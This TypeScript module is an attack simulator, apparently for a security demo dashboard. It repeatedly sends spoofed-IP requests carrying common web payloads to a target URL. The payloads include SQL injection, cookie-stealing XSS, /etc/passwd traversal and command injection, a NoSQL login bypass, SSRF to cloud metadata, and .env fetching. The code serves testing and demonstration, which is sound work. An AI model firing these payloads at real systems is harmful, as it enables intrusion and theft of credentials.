import { broadcastRequest, broadcastDeception } from "./sse-broadcast.js";
import { logger } from "./logger.js";
import { request } from "undici";

let simInterval: NodeJS.Timeout | null = null;

const IPS = [
    "192.168.1.10", "10.0.0.5", "172.16.0.23", "203.0.113.42", "198.51.100.12",
    "45.33.1.1", "185.220.1.1", "103.253.1.1"
];

// Ported from demo-targets attack-simulator.sh
const ATTACKS = [
    { name: "sqli_classic", path: "/api/v1/users?id=1' OR '1'='1", method: "GET" },
    { name: "sqli_union", path: "/api/v1/users?id=1 UNION SELECT NULL,username,password FROM users--", method: "GET" },
    { name: "xss_reflected", path: "/search?q=<script>alert('XSS')</script>", method: "GET" },
    { name: "xss_img", path: "/search?q=<img src=x onerror=alert(document.cookie)>", method: "GET" },
    { name: "traversal_basic", path: "/files?file=../../../../etc/passwd", method: "GET" },
    { name: "cmdi_shell", path: "/ping?host=127.0.0.1;cat /etc/passwd", method: "GET" },
    { name: "auth_nosql", path: "/api/login", method: "POST", body: { "username": { "$ne": null }, "password": { "$ne": null } } },
    { name: "biz_price_negative", path: "/api/cart/add", method: "POST", body: { "item_id": 123, "quantity": -5 } },
    { name: "api_ssrf", path: "/api/fetch?url=http://169.254.169.254/latest/meta-data/", method: "GET" },
    { name: "path_env", path: "/.env", method: "GET" }
];

export function startAttackSimulation(baseUrl: string, intervalMs: number = 2000) {
    if (simInterval) return;

    logger.info({ baseUrl, intervalMs }, "Starting Attack Simulation");

    simInterval = setInterval(async () => {
        const attack = ATTACKS[Math.floor(Math.random() * ATTACKS.length)];
        const ip = IPS[Math.floor(Math.random() * IPS.length)];
        const targetUrl = `${baseUrl}${attack.path}`;

        try {
            const start = Date.now();
            const res = await request(targetUrl, {
                method: attack.method as any,
                headers: {
                    "X-Real-IP": ip,
                    "X-Forwarded-For": ip,
                    "User-Agent": "Mozilla/5.0 (Apparatus Attack Simulator)"
                },
                body: attack.body ? JSON.stringify(attack.body) : undefined
            });

            const duration = Date.now() - start;

            // Broadcast to dashboard
            broadcastRequest({
                method: attack.method,
                path: attack.path,
                status: res.statusCode,
                ip: ip,
                timestamp: new Date().toISOString(),
                latencyMs: duration,
                attackName: attack.name
            });

            logger.debug({ attack: attack.name, status: res.statusCode }, "Attack Simulation: Request sent");

        } catch (error: any) {
            logger.error({ error: error.message }, "Attack Simulation: Error");
        }
    }, intervalMs);
}

export function stopAttackSimulation() {
    if (simInterval) {
        clearInterval(simInterval);
        simInterval = null;
        logger.info("Attack Simulation stopped");
    }
}

export function isSimulationRunning() {
    return simInterval !== null;
}
